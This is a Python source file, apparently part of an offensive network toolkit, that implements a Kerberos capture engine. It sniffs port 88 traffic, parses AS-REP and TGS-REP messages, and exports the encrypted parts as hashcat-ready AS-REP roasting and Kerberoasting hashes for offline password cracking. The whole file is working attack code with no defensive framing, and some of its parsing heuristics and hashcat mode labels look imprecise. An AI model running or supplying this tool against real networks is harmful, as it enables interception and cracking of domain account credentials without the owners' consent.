"""
Kerberos Ticket Capture Module
──────────────────────────────
Captures Kerberos authentication traffic for offline cracking:
  - Sniffs port 88 traffic for Kerberos AS-REQ and TGS-REP messages
  - Parses AS-REQ to extract client principal and encrypted timestamp (AS-REP roasting)
  - Parses TGS-REP to extract service tickets (Kerberoasting)
  - Exports hashes in hashcat format:
    - $krb5asrep$ for AS-REP roasting (mode 18200)
    - $krb5tgs$ for Kerberoasting (mode 13100)
"""

import re
import time
import struct
import binascii
import threading
from collections import defaultdict

from scapy.all import IP, TCP, UDP, Raw, sniff

from .config import log


class KerberosCapture:
    """
    Kerberos ticket capture engine for AS-REP roasting and Kerberoasting.

    Sniffs port 88 (Kerberos) traffic and parses AS-REQ/AS-REP/TGS-REP
    messages to extract encrypted data suitable for offline password cracking.
    """

    # Kerberos message types (application tags)
    KRB_AS_REQ = 10    # [APPLICATION 10]
    KRB_AS_REP = 11    # [APPLICATION 11]
    KRB_TGS_REQ = 12   # [APPLICATION 12]
    KRB_TGS_REP = 13   # [APPLICATION 13]

    # Encryption types
    ETYPE_RC4_HMAC = 23          # RC4-HMAC (arcfour-hmac-md5)
    ETYPE_AES128_CTS = 17        # AES128-CTS-HMAC-SHA1-96
    ETYPE_AES256_CTS = 18        # AES256-CTS-HMAC-SHA1-96

    def __init__(self, interface):
        self.interface = interface
        self._running = False
        self._thread = None
        self._tickets = []
        self._as_rep_hashes = []
        self._tgs_rep_hashes = []
        self._lock = threading.Lock()
        self._packets_processed = 0

    def _parse_asn1_length(self, data, offset):
        """Parse ASN.1 DER length field. Returns (length, new_offset)."""
        if offset >= len(data):
            return 0, offset

        first_byte = data[offset]
        offset += 1

        if first_byte < 0x80:
            return first_byte, offset
        elif first_byte == 0x80:
            # Indefinite length - not standard in Kerberos
            return 0, offset
        else:
            num_bytes = first_byte & 0x7F
            if offset + num_bytes > len(data):
                return 0, offset
            length = 0
            for i in range(num_bytes):
                length = (length << 8) | data[offset + i]
            return length, offset + num_bytes

    def _parse_asn1_tag(self, data, offset):
        """Parse ASN.1 tag byte. Returns (tag_class, constructed, tag_number, new_offset)."""
        if offset >= len(data):
            return None, None, None, offset

        byte = data[offset]
        tag_class = (byte >> 6) & 0x03
        constructed = bool(byte & 0x20)
        tag_number = byte & 0x1F
        offset += 1

        # Long form tag
        if tag_number == 0x1F:
            tag_number = 0
            while offset < len(data):
                b = data[offset]
                offset += 1
                tag_number = (tag_number << 7) | (b & 0x7F)
                if not (b & 0x80):
                    break

        return tag_class, constructed, tag_number, offset

    def _extract_octet_string(self, data, offset, max_len):
        """Extract an OCTET STRING value from ASN.1 data."""
        if offset >= len(data):
            return b"", offset

        tag_class, constructed, tag_num, offset = self._parse_asn1_tag(data, offset)
        length, offset = self._parse_asn1_length(data, offset)

        if length > 0 and offset + length <= len(data):
            value = data[offset:offset + length]
            return value, offset + length
        return b"", offset

    def _find_encrypted_data(self, data):
        """
        Search for EncryptedData structure in Kerberos message.
        EncryptedData ::= SEQUENCE {
            etype [0] Int32,
            kvno  [1] UInt32 OPTIONAL,
            cipher [2] OCTET STRING
        }
        """
        results = []

        # Scan for SEQUENCE containing etype + cipher pattern
        i = 0
        while i < len(data) - 10:
            # Look for context tag [0] followed by INTEGER (etype)
            if data[i] == 0xA0:
                try:
                    # Try to parse as EncryptedData
                    etype, cipher, end_offset = self._try_parse_encrypted_data(data, i)
                    if etype is not None and cipher:
                        results.append({
                            "etype": etype,
                            "cipher": cipher,
                            "offset": i
                        })
                        i = end_offset
                        continue
                except (IndexError, struct.error):
                    pass
            i += 1

        return results

    def _try_parse_encrypted_data(self, data, offset):
        """Try to parse EncryptedData starting at a context tag [0]."""
        # [0] etype
        if data[offset] != 0xA0:
            return None, None, offset

        _, new_offset = self._parse_asn1_length(data, offset + 1)

        # Should contain an INTEGER
        if new_offset >= len(data) or data[new_offset] != 0x02:
            return None, None, offset

        int_len, int_offset = self._parse_asn1_length(data, new_offset + 1)
        if int_offset + int_len > len(data):
            return None, None, offset

        # Parse etype integer
        etype = 0
        for j in range(int_len):
            etype = (etype << 8) | data[int_offset + j]
        pos = int_offset + int_len

        # Skip optional [1] kvno
        if pos < len(data) and data[pos] == 0xA1:
            _, kvno_start = self._parse_asn1_length(data, pos + 1)
            if kvno_start < len(data) and data[kvno_start] == 0x02:
                kvno_len, kvno_data_start = self._parse_asn1_length(data, kvno_start + 1)
                pos = kvno_data_start + kvno_len

        # [2] cipher
        if pos >= len(data) or data[pos] != 0xA2:
            return None, None, offset

        _, cipher_container_start = self._parse_asn1_length(data, pos + 1)

        # OCTET STRING
        if cipher_container_start >= len(data) or data[cipher_container_start] != 0x04:
            return None, None, offset

        cipher_len, cipher_start = self._parse_asn1_length(data, cipher_container_start + 1)
        if cipher_start + cipher_len > len(data):
            return None, None, offset

        cipher = data[cipher_start:cipher_start + cipher_len]
        return etype, cipher, cipher_start + cipher_len

    def _extract_principal(self, data):
        """
        Extract principal name from Kerberos message data.
        Looks for GeneralString values that look like usernames/service names.
        """
        # Simple heuristic: look for readable ASCII strings after name-type indicators
        principals = []
        i = 0
        while i < len(data) - 4:
            # Look for GeneralString tag (0x1B) or UTF8String (0x0C)
            if data[i] in (0x1B, 0x0C, 0x16):  # GeneralString, UTF8String, IA5String
                str_len = data[i + 1] if i + 1 < len(data) else 0
                if 1 < str_len < 128 and i + 2 + str_len <= len(data):
                    try:
                        s = data[i + 2:i + 2 + str_len].decode('ascii')
                        if s.isprintable() and len(s) > 1:
                            principals.append(s)
                    except (UnicodeDecodeError, ValueError):
                        pass
                i += 2 + str_len
            else:
                i += 1

        return principals

    def _extract_realm(self, data):
        """Extract realm (domain) from Kerberos message."""
        # Realm is typically a GeneralString after context tag [1] or similar
        principals = self._extract_principal(data)
        # Realm is usually uppercase domain-like string
        for p in principals:
            if p.isupper() and "." in p:
                return p
            if p.isupper() and len(p) > 2:
                return p
        return "UNKNOWN"

    def _packet_handler(self, pkt):
        """Process Kerberos packets."""
        if not pkt.haslayer(Raw):
            return

        # Kerberos uses TCP or UDP port 88
        has_tcp = pkt.haslayer(TCP)
        has_udp = pkt.haslayer(UDP)

        if has_tcp:
            if pkt[TCP].dport != 88 and pkt[TCP].sport != 88:
                return
        elif has_udp:
            if pkt[UDP].dport != 88 and pkt[UDP].sport != 88:
                return
        else:
            return

        self._packets_processed += 1
        payload = bytes(pkt[Raw].load)
        src_ip = pkt[IP].src if pkt.haslayer(IP) else "unknown"
        dst_ip = pkt[IP].dst if pkt.haslayer(IP) else "unknown"

        # For TCP, skip the 4-byte length prefix
        if has_tcp and len(payload) > 4:
            tcp_len = struct.unpack(">I", payload[:4])[0]
            if tcp_len + 4 <= len(payload):
                payload = payload[4:]

        if len(payload) < 10:
            return

        # Determine Kerberos message type from ASN.1 APPLICATION tag
        # APPLICATION tags: 0x6a = AS-REQ(10), 0x6b = AS-REP(11),
        #                   0x6c = TGS-REQ(12), 0x6d = TGS-REP(13)
        first_byte = payload[0]

        if first_byte == 0x6B:  # AS-REP [APPLICATION 11]
            self._process_as_rep(payload, src_ip, dst_ip)
        elif first_byte == 0x6D:  # TGS-REP [APPLICATION 13]
            self._process_tgs_rep(payload, src_ip, dst_ip)
        elif first_byte == 0x6A:  # AS-REQ [APPLICATION 10]
            self._process_as_req(payload, src_ip, dst_ip)

    def _process_as_req(self, data, src_ip, dst_ip):
        """Process AS-REQ to extract client principal for correlation."""
        principals = self._extract_principal(data)
        if principals:
            log.info(
                f"Kerberos AS-REQ from {src_ip}: "
                f"client={'/'.join(principals[:2])}"
            )

    def _process_as_rep(self, data, src_ip, dst_ip):
        """
        Process AS-REP for AS-REP roasting.
        Extract encrypted part and format as $krb5asrep$ hash.
        """
        principals = self._extract_principal(data)
        realm = self._extract_realm(data)
        encrypted_parts = self._find_encrypted_data(data)

        if not encrypted_parts:
            return

        # The AS-REP contains enc-part with the user's encrypted data
        # Use the last EncryptedData (typically the enc-part of the ticket or enc-part of AS-REP)
        for enc in encrypted_parts:
            etype = enc["etype"]
            cipher = enc["cipher"]

            if etype not in (self.ETYPE_RC4_HMAC, self.ETYPE_AES128_CTS, self.ETYPE_AES256_CTS):
                continue

            cipher_hex = binascii.hexlify(cipher).decode()

            # Determine username
            username = principals[0] if principals else "unknown"

            # Format: $krb5asrep$etype$user@REALM:cipher
            if etype == self.ETYPE_RC4_HMAC:
                # hashcat mode 18200
                # $krb5asrep$23$user@domain:checksum$encrypted
                if len(cipher) > 16:
                    checksum = binascii.hexlify(cipher[:16]).decode()
                    encrypted = binascii.hexlify(cipher[16:]).decode()
                    hash_str = f"$krb5asrep$23${username}@{realm}:{checksum}${encrypted}"
                else:
                    hash_str = f"$krb5asrep$23${username}@{realm}:{cipher_hex}"
            elif etype == self.ETYPE_AES256_CTS:
                hash_str = f"$krb5asrep$18${username}@{realm}:{cipher_hex}"
            elif etype == self.ETYPE_AES128_CTS:
                hash_str = f"$krb5asrep$17${username}@{realm}:{cipher_hex}"
            else:
                continue

            ticket_record = {
                "type": "AS-REP",
                "username": username,
                "realm": realm,
                "etype": etype,
                "hash": hash_str,
                "hashcat_mode": 18200,
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "timestamp": time.time(),
                "principals": principals
            }

            with self._lock:
                self._tickets.append(ticket_record)
                self._as_rep_hashes.append(hash_str)

            log.critical(
                f"KERBEROS AS-REP ROAST: {username}@{realm} "
                f"(etype={etype}) from {src_ip}"
            )
            break  # Use the first valid encrypted part

    def _process_tgs_rep(self, data, src_ip, dst_ip):
        """
        Process TGS-REP for Kerberoasting.
        Extract service ticket and format as $krb5tgs$ hash.
        """
        principals = self._extract_principal(data)
        realm = self._extract_realm(data)
        encrypted_parts = self._find_encrypted_data(data)

        if not encrypted_parts:
            return

        for enc in encrypted_parts:
            etype = enc["etype"]
            cipher = enc["cipher"]

            if etype not in (self.ETYPE_RC4_HMAC, self.ETYPE_AES128_CTS, self.ETYPE_AES256_CTS):
                continue

            cipher_hex = binascii.hexlify(cipher).decode()

            # Determine service principal
            service_name = "/".join(principals[:2]) if len(principals) >= 2 else (
                principals[0] if principals else "unknown"
            )

            # Format: $krb5tgs$etype$*user$realm$spn*$checksum$encrypted
            if etype == self.ETYPE_RC4_HMAC:
                # hashcat mode 13100
                if len(cipher) > 16:
                    checksum = binascii.hexlify(cipher[:16]).decode()
                    encrypted = binascii.hexlify(cipher[16:]).decode()
                    hash_str = (
                        f"$krb5tgs$23$*{service_name}${realm}${service_name}*"
                        f"${checksum}${encrypted}"
                    )
                else:
                    hash_str = f"$krb5tgs$23$*{service_name}${realm}${service_name}*${cipher_hex}"
            elif etype == self.ETYPE_AES256_CTS:
                hash_str = f"$krb5tgs$18$*{service_name}${realm}${service_name}*${cipher_hex}"
            elif etype == self.ETYPE_AES128_CTS:
                hash_str = f"$krb5tgs$17$*{service_name}${realm}${service_name}*${cipher_hex}"
            else:
                continue

            ticket_record = {
                "type": "TGS-REP",
                "service": service_name,
                "realm": realm,
                "etype": etype,
                "hash": hash_str,
                "hashcat_mode": 13100,
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "timestamp": time.time(),
                "principals": principals
            }

            with self._lock:
                self._tickets.append(ticket_record)
                self._tgs_rep_hashes.append(hash_str)

            log.critical(
                f"KERBEROS TGS-REP (Kerberoast): {service_name}@{realm} "
                f"(etype={etype}) from {src_ip}"
            )
            break

    def _sniff_loop(self):
        """Background sniffing thread."""
        try:
            sniff(
                iface=self.interface,
                prn=self._packet_handler,
                store=False,
                filter="tcp port 88 or udp port 88",
                stop_filter=lambda x: not self._running
            )
        except Exception as e:
            log.error(f"Kerberos capture sniff error: {e}")

    def start(self):
        """Start Kerberos ticket capture."""
        if self._running:
            log.warning("Kerberos capture already running")
            return False

        self._running = True
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()
        log.info(f"Kerberos capture started on {self.interface}")
        return True

    def stop(self):
        """Stop Kerberos ticket capture."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info(f"Kerberos capture stopped. {len(self._tickets)} tickets captured")

    def get_tickets(self):
        """Return all captured tickets."""
        with self._lock:
            return list(self._tickets)

    def get_as_rep_hashes(self):
        """Return AS-REP roasting hashes only."""
        with self._lock:
            return list(self._as_rep_hashes)

    def get_tgs_rep_hashes(self):
        """Return Kerberoasting (TGS-REP) hashes only."""
        with self._lock:
            return list(self._tgs_rep_hashes)

    def export_hashcat(self, output_file=None, ticket_type=None):
        """
        Export captured hashes in hashcat format.
        ticket_type: 'asrep' for AS-REP only, 'tgs' for TGS only, None for all.
        """
        with self._lock:
            lines = []
            if ticket_type == "asrep" or ticket_type is None:
                lines.extend(self._as_rep_hashes)
            if ticket_type == "tgs" or ticket_type is None:
                lines.extend(self._tgs_rep_hashes)

            if output_file:
                with open(output_file, "w") as f:
                    f.write("\n".join(lines) + "\n")
                log.info(f"Exported {len(lines)} Kerberos hashes to {output_file}")

            return lines

    def get_stats(self):
        """Return Kerberos capture statistics."""
        with self._lock:
            by_type = defaultdict(int)
            by_etype = defaultdict(int)
            for t in self._tickets:
                by_type[t["type"]] += 1
                by_etype[t["etype"]] += 1

            return {
                "running": self._running,
                "total_tickets": len(self._tickets),
                "as_rep_hashes": len(self._as_rep_hashes),
                "tgs_rep_hashes": len(self._tgs_rep_hashes),
                "packets_processed": self._packets_processed,
                "by_type": dict(by_type),
                "by_etype": dict(by_etype),
            }
